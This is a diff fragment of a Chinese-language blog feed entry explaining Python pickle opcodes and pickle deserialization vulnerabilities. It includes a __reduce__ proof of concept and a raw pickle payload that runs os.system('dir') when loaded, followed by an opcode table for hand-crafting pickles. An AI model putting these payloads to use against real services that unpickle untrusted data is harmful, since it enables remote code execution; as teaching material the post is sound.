+&lt;h3 id=&#34;python2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python2&#34;&gt;#&lt;/a&gt; python2&lt;/h3&gt;
+&lt;p&gt;几个比较重要的操作码：&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;c: 读取本行的内容作为模块名（module）, 读取下一行的内容作为对象名object，然后将 module.object作为可调用对象压入到栈中
 (: 将一个标记对象压入到栈中 , 用于确定命令执行的位置 . 该标记常常搭配 t 指令一起使用 , 以便产生一个元组
 S: 后面跟字符串 , PVM会读取引号中的内容 , 直到遇见换行符 , 然后将读取到的内容压入到栈中
@@ -1070,52 +1029,41 @@ object				#引入object对象
 p2					#将栈顶数据(__builtin__.object)存储在memo中，2是编号
 Ntp3				#依次从栈中弹出数据直到(，此时弹出的数据组成一个元组，最后将该元组入栈
 Rp4					#将元组和可调用对象全部弹出并执行，将结果压入栈顶，然后将栈顶数据存储在memo中
-                    #这里便完成了所有需要的模块和类对象的调用
+					#这里便完成了所有需要的模块和类对象的调用
 (dp5				#在栈顶创建一个字典，将memo中的内容转换成键值对并存储在这个字典中
-                    #然后栈顶(这个字典)存储在memo中，5是编号
-S&amp;#39;value2&amp;#39;			#创建字符串&amp;#39;value2&amp;#39;
+					#然后栈顶(这个字典)存储在memo中，5是编号
+S&#39;value2&#39;			#创建字符串&#39;value2&#39;
 p6					#存储在memo中
-S&amp;#39;b&amp;#39;				#创建字符串’b‘
+S&#39;b&#39;				#创建字符串’b‘
 p7					#存储在memo中
-sS&amp;#39;value1&amp;#39;			#s:将&amp;#39;value2&amp;#39;:&amp;#39;b&amp;#39;作为键值对添加到字典中，创建字符串&amp;#39;value1&amp;#39;
+sS&#39;value1&#39;			#s:将&#39;value2&#39;:&#39;b&#39;作为键值对添加到字典中，创建字符串&#39;value1&#39;
 p8					#存储在memo中
-S&amp;#39;a&amp;#39;				#创建字符串&amp;#39;a&amp;#39;
+S&#39;a&#39;				#创建字符串&#39;a&#39;
 p9					#存储在memo中
-sb.					#将&amp;#39;value1&amp;#39;:&amp;#39;a&amp;#39;作为键值对添加到字典中,b:调用setstate或者dic.update()更新字典内容
-                    #读取到.结束pickle序列化过程
+sb.					#将&#39;value1&#39;:&#39;a&#39;作为键值对添加到字典中,b:调用setstate或者dic.update()更新字典内容
+					#读取到.结束pickle序列化过程
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L2NvcHlfcmVnLmh0bWw=&#34;&gt;copy_reg&lt;/span&gt; 模块，提供了在 pickle 或是 copy 特定对象时，可以运行一个指定的函数，作为对象的构造器&lt;/p&gt;
-&lt;h3 id=&#34;python3&#34;&gt;&lt;a href=&#34;#python3&#34; class=&#34;headerlink&#34; title=&#34;python3&#34;&gt;&lt;/a&gt;python3&lt;/h3&gt;&lt;p&gt;python运行结果与python2不同，这里只有picpletools&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820163443278.png&#34; alt=&#34;image-20220820163443278&#34;&gt;&lt;/p&gt;
-&lt;p&gt;0x80：机器看到这个操作符，立刻再去字符串读取一个字节，得到x04。解释为“这是一个依据4号协议序列化的字符串”，这个操作结束。&lt;br&gt; \x8c：创建（引入）对象&lt;/p&gt;
-&lt;p&gt;)：向栈中压入一个空数组&lt;br&gt;\x81：从栈空间弹出一个类和参数，并用这个参数实例化这个弹出来的类，最终把实例化的类再次压回栈中。&lt;br&gt;}：压入一个空的字典&lt;br&gt;(：向栈中压入一个MARK标记&lt;br&gt;X&amp;#x2F;V：实例化一个字符串&lt;br&gt;u：以键值对的形式进行数据组合（组合的数据为当前栈空间位置到上一个MARK之间的数据），并全部添加或更新到该MARK之前的一个字典中&lt;br&gt;b：利用填充好的字典和实例化好的对象进行属性赋值。&lt;br&gt;. STOP简单易懂，结束序列化。&lt;/p&gt;
-&lt;h2 id=&#34;pickle反序列化漏洞分析&#34;&gt;&lt;a href=&#34;#pickle反序列化漏洞分析&#34; class=&#34;headerlink&#34; title=&#34;pickle反序列化漏洞分析&#34;&gt;&lt;/a&gt;pickle反序列化漏洞分析&lt;/h2&gt;&lt;p&gt;常见python反序列化漏洞出现在__educe__()魔法函数上，这个函数与PHP中的__wakeup（）魔术方法类似，都是因为每当反序列化时自动调用&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import pickle
-import os
-import pickletools
-
-class test(object):
-    def __init__(self):
-        self.value1=&amp;#39;abc1&amp;#39;
-        self.value2=&amp;#39;abc2&amp;#39;
-
-    def __reduce__(self):
-        ls=&amp;quot;dir&amp;quot;
-        return (os.system,(ls,))
-
-user = test()
-y = pickle.dumps(user)
-y = pickletools.optimize(y)
-print(y)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820162806423.png&#34; alt=&#34;image-20220820162806423&#34;&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import pickle
-payload=b&amp;#39;\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x8c\x06system\x93\x8c\x03dir\x85R.&amp;#39;
-pickle.loads(payload)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820162837675.png&#34; alt=&#34;image-20220820162837675&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;python3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python3&#34;&gt;#&lt;/a&gt; python3&lt;/h3&gt;
+&lt;p&gt;python 运行结果与 python2 不同，这里只有 picpletools&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820163443278.png&#34; alt=&#34;image-20220820163443278&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;0x80：机器看到这个操作符，立刻再去字符串读取一个字节，得到 x04。解释为 “这是一个依据 4 号协议序列化的字符串”，这个操作结束。&lt;br /&gt;
+\x8c：创建（引入）对象&lt;/p&gt;
+&lt;p&gt;)：向栈中压入一个空数组&lt;br /&gt;
+ \x81：从栈空间弹出一个类和参数，并用这个参数实例化这个弹出来的类，最终把实例化的类再次压回栈中。&lt;br /&gt;
+}：压入一个空的字典&lt;br /&gt;
+ (：向栈中压入一个 MARK 标记&lt;br /&gt;
+ X/V：实例化一个字符串&lt;br /&gt;
+ u：以键值对的形式进行数据组合（组合的数据为当前栈空间位置到上一个 MARK 之间的数据），并全部添加或更新到该 MARK 之前的一个字典中&lt;br /&gt;
+ b：利用填充好的字典和实例化好的对象进行属性赋值。&lt;br /&gt;
+. STOP 简单易懂，结束序列化。&lt;/p&gt;
+&lt;h2 id=&#34;pickle反序列化漏洞分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pickle反序列化漏洞分析&#34;&gt;#&lt;/a&gt; pickle 反序列化漏洞分析&lt;/h2&gt;
+&lt;p&gt;常见 python 反序列化漏洞出现在__educe__() 魔法函数上，这个函数与 PHP 中的__wakeup（）魔术方法类似，都是因为每当反序列化时自动调用&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pickle&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; os&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pickletools&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;abc1&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;abc2&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__reduce__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        ls&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;dir&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;system&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ls&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; test&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; pickle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dumps&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;user&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; pickletools&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;optimize&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820162806423.png&#34; alt=&#34;image-20220820162806423&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pickle&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x8c\x06system\x93\x8c\x03dir\x85R.&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pickle&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;loads&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820162837675.png&#34; alt=&#34;image-20220820162837675&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这里成功执行了系统命令&lt;/p&gt;
-&lt;h2 id=&#34;opcode&#34;&gt;&lt;a href=&#34;#opcode&#34; class=&#34;headerlink&#34; title=&#34;opcode&#34;&gt;&lt;/a&gt;opcode&lt;/h2&gt;&lt;p&gt;如果需要一次执行多个函数，那么opcode尤为重要&lt;/p&gt;
+&lt;h2 id=&#34;opcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#opcode&#34;&gt;#&lt;/a&gt; opcode&lt;/h2&gt;
+&lt;p&gt;如果需要一次执行多个函数，那么 opcode 尤为重要&lt;/p&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -1123,33 +1071,34 @@ pickle.loads(payload)
 &lt;th&gt;描述&lt;/th&gt;
 &lt;th&gt;具体写法&lt;/th&gt;
 &lt;th&gt;栈上的变化&lt;/th&gt;
-&lt;th&gt;memo上的变化&lt;/th&gt;
+&lt;th&gt;memo 上的变化&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
-&lt;tbody&gt;&lt;tr&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
 &lt;td&gt;c&lt;/td&gt;
-&lt;td&gt;获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）&lt;/td&gt;
+&lt;td&gt;获取一个全局对象或 import 一个模块（注：会调用 import 语句，能够引入新的包）&lt;/td&gt;
 &lt;td&gt;c[module]\n[instance]\n&lt;/td&gt;
 &lt;td&gt;获得的对象入栈&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;o&lt;/td&gt;
-&lt;td&gt;寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）&lt;/td&gt;
+&lt;td&gt;寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象）&lt;/td&gt;
 &lt;td&gt;o&lt;/td&gt;
 &lt;td&gt;这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;i&lt;/td&gt;
-&lt;td&gt;相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）&lt;/td&gt;
+&lt;td&gt;相当于 c 和 o 的组合，先获取一个全局函数，然后寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）&lt;/td&gt;
 &lt;td&gt;i[module]\n[callable]\n&lt;/td&gt;
 &lt;td&gt;这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;N&lt;/td&gt;
-&lt;td&gt;实例化一个None&lt;/td&gt;
+&lt;td&gt;实例化一个 None&lt;/td&gt;
 &lt;td&gt;N&lt;/td&gt;
 &lt;td&gt;获得的对象入栈&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
@@ -1157,27 +1106,27 @@ pickle.loads(payload)
 &lt;tr&gt;
 &lt;td&gt;S&lt;/td&gt;
 &lt;td&gt;实例化一个字符串对象&lt;/td&gt;
-&lt;td&gt;S’xxx’\n（也可以使用双引号、&amp;#39;等python字符串形式）&lt;/td&gt;
+&lt;td&gt;S&#39;xxx&#39;\n（也可以使用双引号、&#39; 等 python 字符串形式）&lt;/td&gt;
 &lt;td&gt;获得的对象入栈&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;V&lt;/td&gt;
-&lt;td&gt;实例化一个UNICODE字符串对象&lt;/td&gt;
+&lt;td&gt;实例化一个 UNICODE 字符串对象&lt;/td&gt;
 &lt;td&gt;Vxxx\n&lt;/td&gt;
 &lt;td&gt;获得的对象入栈&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;I&lt;/td&gt;
-&lt;td&gt;实例化一个int对象&lt;/td&gt;
+&lt;td&gt;实例化一个 int 对象&lt;/td&gt;
 &lt;td&gt;Ixxx\n&lt;/td&gt;
 &lt;td&gt;获得的对象入栈&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;F&lt;/td&gt;
-&lt;td&gt;实例化一个float对象&lt;/td&gt;
+&lt;td&gt;实例化一个 float 对象&lt;/td&gt;
 &lt;td&gt;Fx.x\n&lt;/td&gt;
 &lt;td&gt;获得的对象入栈&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
@@ -1191,23 +1140,23 @@ pickle.loads(payload)
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;.&lt;/td&gt;
-&lt;td&gt;程序结束，栈顶的一个元素作为pickle.loads()的返回值&lt;/td&gt;
+&lt;td&gt;程序结束，栈顶的一个元素作为 pickle.loads () 的返回值&lt;/td&gt;
 &lt;td&gt;.&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;(&lt;/td&gt;
-&lt;td&gt;向栈中压入一个MARK标记&lt;/td&gt;
+&lt;td&gt;向栈中压入一个 MARK 标记&lt;/td&gt;
 &lt;td&gt;(&lt;/td&gt;
-&lt;td&gt;MARK标记入栈&lt;/td&gt;
+&lt;td&gt;MARK 标记入栈&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;t&lt;/td&gt;
-&lt;td&gt;寻找栈中的上一个MARK，并组合之间的数据为元组&lt;/td&gt;
+&lt;td&gt;寻找栈中的上一个 MARK，并组合之间的数据为元组&lt;/td&gt;
 &lt;td&gt;t&lt;/td&gt;
-&lt;td&gt;MARK标记以及被组合的数据出栈，获得的对象入栈&lt;/td&gt;
+&lt;td&gt;MARK 标记以及被组合的数据出栈，获得的对象入栈&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
@@ -1219,9 +1168,9 @@ pickle.loads(payload)
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;l&lt;/td&gt;
-&lt;td&gt;寻找栈中的上一个MARK，并组合之间的数据为列表&lt;/td&gt;
+&lt;td&gt;寻找栈中的上一个 MARK，并组合之间的数据为列表&lt;/td&gt;
 &lt;td&gt;l&lt;/td&gt;
-&lt;td&gt;MARK标记以及被组合的数据出栈，获得的对象入栈&lt;/td&gt;
+&lt;td&gt;MARK 标记以及被组合的数据出栈，获得的对象入栈&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
@@ -1233,9 +1182,9 @@ pickle.loads(payload)
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;d&lt;/td&gt;
-&lt;td&gt;寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）&lt;/td&gt;
+&lt;td&gt;寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对）&lt;/td&gt;
 &lt;td&gt;d&lt;/td&gt;
-&lt;td&gt;MARK标记以及被组合的数据出栈，获得的对象入栈&lt;/td&gt;
+&lt;td&gt;MARK 标记以及被组合的数据出栈，获得的对象入栈&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
@@ -1247,14 +1196,14 @@ pickle.loads(payload)
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;p&lt;/td&gt;
-&lt;td&gt;将栈顶对象储存至memo_n&lt;/td&gt;
+&lt;td&gt;将栈顶对象储存至 memo_n&lt;/td&gt;
 &lt;td&gt;pn\n&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;td&gt;对象被储存&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;g&lt;/td&gt;
-&lt;td&gt;将memo_n的对象压栈&lt;/td&gt;
+&lt;td&gt;将 memo_n 的对象压栈&lt;/td&gt;
 &lt;td&gt;gn\n&lt;/td&gt;
 &lt;td&gt;对象被压栈&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
@@ -1268,41 +1217,43 @@ pickle.loads(payload)
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;b&lt;/td&gt;
-&lt;td&gt;使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置&lt;/td&gt;
+&lt;td&gt;使用栈中的第一个元素（储存多个属性名：属性值的字典）对第二个元素（对象实例）进行属性设置&lt;/td&gt;
 &lt;td&gt;b&lt;/td&gt;
 &lt;td&gt;栈上第一个元素出栈&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;s&lt;/td&gt;
-&lt;td&gt;将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中&lt;/td&gt;
+&lt;td&gt;将栈的第一个和第二个对象作为 key-value 对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中&lt;/td&gt;
 &lt;td&gt;s&lt;/td&gt;
 &lt;td&gt;第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;u&lt;/td&gt;
-&lt;td&gt;寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中&lt;/td&gt;
+&lt;td&gt;寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中&lt;/td&gt;
 &lt;td&gt;u&lt;/td&gt;
-&lt;td&gt;MARK标记以及被组合的数据出栈，字典被更新&lt;/td&gt;
+&lt;td&gt;MARK 标记以及被组合的数据出栈，字典被更新&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;a&lt;/td&gt;
-&lt;td&gt;将栈的第一个元素append到第二个元素(列表)中&lt;/td&gt;
+&lt;td&gt;将栈的第一个元素 append 到第二个元素 (列表) 中&lt;/td&gt;
 &lt;td&gt;a&lt;/td&gt;
 &lt;td&gt;栈顶元素出栈，第二个元素（列表）被更新&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;e&lt;/td&gt;
-&lt;td&gt;寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中&lt;/td&gt;
+&lt;td&gt;寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中&lt;/td&gt;
 &lt;td&gt;e&lt;/td&gt;
-&lt;td&gt;MARK标记以及被组合的数据出栈，列表被更新&lt;/td&gt;
+&lt;td&gt;MARK 标记以及被组合的数据出栈，列表被更新&lt;/td&gt;
 &lt;td&gt;无&lt;/td&gt;
 &lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
-&lt;h4 id=&#34;拼接opcode&#34;&gt;&lt;a href=&#34;#拼接opcode&#34; class=&#34;headerlink&#34; title=&#34;拼接opcode&#34;&gt;&lt;/a&gt;拼接opcode&lt;/h4&gt;&lt;p&gt;将第一个pickle流结尾表示结束的 .去掉，将第二个pickle流与第一个拼接起来即可。&lt;/p&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&#34;拼接opcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#拼接opcode&#34;&gt;#&lt;/a&gt; 拼接 opcode&lt;/h4&gt;
+&lt;p&gt;将第一个 pickle 流结尾表示结束的。去掉，将第二个 pickle 流与第一个拼接起来即可。&lt;/p&gt;
 </content>
         <category term="Python" scheme="https://blog.xcu.icu/categories/Python/" />
         <category term="Python" scheme="https://blog.xcu.icu/tags/Python/" />
